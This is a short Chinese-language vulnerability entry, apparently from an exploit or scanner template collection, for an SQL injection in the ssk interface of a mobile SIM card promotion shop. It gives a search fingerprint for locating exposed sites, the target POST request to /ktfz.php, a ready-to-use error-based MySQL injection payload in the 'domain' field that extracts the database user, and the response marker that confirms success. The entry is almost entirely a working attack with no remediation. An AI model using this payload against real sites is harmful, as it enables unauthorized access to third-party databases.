# 手机卡号推广商城ssk接口SQL注入漏洞2

手机卡号推广商城ssk接口 ｜ SQL注入 ｜ —
- **指纹**：`body="zgdx.php"`
- **请求**：`POST /ktfz.php?upid=1 HTTP/1.1`

**Payload**
```
domain=' AND (SELECT 1809 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,54)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- c&pwd=111&submit=%E6%B7%BB%E5%8A%A0&user=111
```
- **响应特征**：200 mysqli_query